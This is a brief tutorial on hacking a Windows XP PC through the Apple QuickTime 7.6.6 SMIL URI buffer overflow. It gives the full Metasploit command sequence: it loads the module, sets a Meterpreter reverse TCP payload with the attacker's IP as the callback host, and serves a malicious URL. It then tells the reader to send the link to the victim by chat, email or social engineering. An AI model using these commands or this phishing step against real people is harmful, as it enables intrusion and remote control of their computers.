Hack Windows PC using Apple QuickTime 7.6.6 Invalid SMIL URI Buffer Overflow

This module exploits a buffer overflow in Apple QuickTime 7.6.6. When processing a malformed SMIL uri, a stack-based buffer overflow can occur when logging an error message.
Apple QuickTime 7.6.6
Windows XP SP2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/apple_quicktime_smil_debug
Msf exploit (apple_quicktime_smil_debug)>set payload windows/meterpreter/reverse_tcp
Msf exploit (apple_quicktime_smil_debug)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (apple_quicktime_smil_debug)>set srvhost 192.168.1.2 (This must be an address on the local machine)
Msf exploit (apple_quicktime_smil_debug)>set uripath appleplayer (The Url to use for this exploit)
Msf exploit (apple_quicktime_smil_debug)>exploit

Now an URL you should give to your victim http://192.168.1.2:8080/appleplayer

Send the link of the server to the victim via chat or email or any social engineering technique.
